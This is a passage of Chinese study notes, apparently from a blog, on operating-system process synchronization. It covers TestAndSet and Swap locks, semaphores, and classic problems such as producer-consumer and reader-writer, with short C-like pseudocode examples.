&lt;p&gt;不满足让权等待，会盲等&lt;/p&gt;
&lt;p&gt;C 语言描述逻辑：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//true 表示已经上锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bool &lt;span class=&#34;token function&#34;&gt;TestAndSet&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bool &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;lock&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    bool old&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    old&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;lock&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;lock&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;true&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; old&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 以下是使用 TSL 指令实现互斥的算法逻辑&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;TestAndSet&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;lock&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 上锁并检查&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;临界区代码段&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lock&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;false&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 解锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;12345678910111213&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;3、Swap 指令&lt;/p&gt;
&lt;p&gt;别称：Exchange 指令、XCHG 指令&lt;/p&gt;
&lt;p&gt;Swap 指令是用硬件实现的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//true 表示已经上锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;Swap&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bool &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bool &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    bool temp&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    temp&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;b&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;temp&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 以下是使用 Swap 指令实现互斥的算法逻辑&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bool old&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;true&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;old&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;true&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;Swap&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;lock&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;old&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;临界区代码段&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lock&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;false&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 解锁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 剩余代码段&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;123456789101112131415&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;简单&lt;/p&gt;
&lt;p&gt;适用多处理机&lt;/p&gt;
&lt;p&gt;不能让权等待&lt;/p&gt;
&lt;h3 id=&#34;23_4-信号量机制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_4-信号量机制&#34;&gt;#&lt;/a&gt; 2.3_4 信号量机制&lt;/h3&gt;
&lt;p&gt;信号量：&lt;/p&gt;
&lt;p&gt;信号量是一种变量，表示系统中某种资源的数量&lt;/p&gt;
&lt;p&gt;一对原语：wait（S）原语和 signal（S）原语，分别简称 P（S）、V（S）&lt;/p&gt;
&lt;p&gt;1、整形信号量&lt;/p&gt;
&lt;p&gt;用一个整数表示系统资源的变量，用来表示系统中某种资源的数量&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; S&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;wait&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;//wait 原语，相当于：进入区&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 如果资源数不够，就意志循环等待&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    S&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;S&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 如果资源数够，则占用一个资源&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;signal&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//signal 原语，相当于 “退出区”&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    S&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;S&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;         &lt;span class=&#34;token comment&#34;&gt;// 使用完资源后，在退出区释放资源&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;123456789&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可能会出现盲等&lt;/p&gt;
&lt;p&gt;2、记录型信号量&lt;/p&gt;
&lt;p&gt;记录型数据结构表示的信号量&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 记录型信号量的定义&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; value&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;process&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;L&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; semaphore&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 某进程需要使用资源时，通过 wait 原语申请&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;wait&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;semaphore S&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;block&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;L&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 将该进程加入到消息队列中&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 进程使用完资源后，通过 signal 原语释放&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;signal&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;semaphore S&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;valie&lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;wakeup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;S&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;L&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;12345678910111213141516171819&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;除非特别说明，否则默认 S 为记录型信号量&lt;/p&gt;
&lt;h3 id=&#34;23_5-用信号量机制实现进程互斥-同步-前驱关系&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_5-用信号量机制实现进程互斥-同步-前驱关系&#34;&gt;#&lt;/a&gt; 2.3_5 用信号量机制实现进程互斥、同步、前驱关系&lt;/h3&gt;
&lt;p&gt;1、实现进程互斥&lt;/p&gt;
&lt;p&gt;设置互斥信号量 mutex，初值为 1&lt;/p&gt;
&lt;p&gt;对不同的临界资源需要设置不同的互斥信号量&lt;/p&gt;
&lt;p&gt;PV 必须成对出现&lt;/p&gt;
&lt;p&gt;2、实现进程同步&lt;/p&gt;
&lt;p&gt;保证一前一后的操作顺序&lt;/p&gt;
&lt;p&gt;设置同步信号量 S，初始为 0&lt;/p&gt;
&lt;p&gt;在 “前操作” 之后执行 V（S）&lt;/p&gt;
&lt;p&gt;在 “后操作” 之后执行（V）&lt;/p&gt;
&lt;p&gt;3、实现进程的前驱关系&lt;/p&gt;
&lt;p&gt;1、要为每一对前驱关系各设置一个同步变量&lt;/p&gt;
&lt;p&gt;2、在 “前操作” 之后对相应的同步变量执行 V 操作&lt;/p&gt;
&lt;p&gt;3、在 “后操作” 之前对相应的同步变量执行 P 操作&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;F:/Typora%E6%88%AA%E5%9B%BE/e03e2a2147ac136fc5b50074b89844e8.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_6-生产者-消费者问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_6-生产者-消费者问题&#34;&gt;#&lt;/a&gt; 2.3_6 生产者 - 消费者问题&lt;/h3&gt;
&lt;p&gt;（好像很幼稚的逻辑&lt;/p&gt;
&lt;p&gt;只有缓冲区没满时，生产者才能把产品放入缓冲区，否则必须等待&lt;/p&gt;
&lt;p&gt;只有缓冲区不空时，消费者才能从中取出产品，否则必须等待&lt;/p&gt;
&lt;p&gt;缓冲区是临界资源，各个进程互斥访问&lt;/p&gt;
&lt;p&gt;实现互斥的 P 操作要放在实现同步的 P 操作之后，不然会发生死锁&lt;/p&gt;
&lt;p&gt;V 操作不会导致进程发生阻塞的状态，所以可以交换&lt;/p&gt;
&lt;p&gt;使用操作不要放在临界区，不然并发度会降低&lt;/p&gt;
&lt;h3 id=&#34;23_7-多生产者-多消费者模型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_7-多生产者-多消费者模型&#34;&gt;#&lt;/a&gt; 2.3_7 多生产者 - 多消费者模型&lt;/h3&gt;
&lt;p&gt;在生产 - 消费者问题中，如果缓冲区大小为 1，那么有可能不需要设置互斥信号量就可以实现互斥访问缓冲区&lt;/p&gt;
&lt;p&gt;分析同步问题是，应该从 “事件” 的角度来考虑&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;F:/Typora%E6%88%AA%E5%9B%BE/68b1e50aeeabfa85ad0126a7176deb5c.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_8-吸烟者问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_8-吸烟者问题&#34;&gt;#&lt;/a&gt; 2.3_8 吸烟者问题&lt;/h3&gt;
&lt;p&gt;解决 “可以让生产多个产品的单生产者” 问题提供一个思路；&lt;/p&gt;
&lt;p&gt;若一个生产者要生产多种产品（或者说会引发多种前驱事件），那么各个 V 操作应该放在各自对应的 “事件” 发生之后的位置&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;F:/Typora%E6%88%AA%E5%9B%BE/40dc9cd7ea6625ed2be56e75b637ec5d.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;23_9-读者-写者问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_9-读者-写者问题&#34;&gt;#&lt;/a&gt; 2.3_9 读者 - 写者问题&lt;/h3&gt;
&lt;p&gt;1、允许多个读者同时对文件执行读操作&lt;/p&gt;
&lt;p&gt;2、只允许一个写者往文件中写信息&lt;/p&gt;
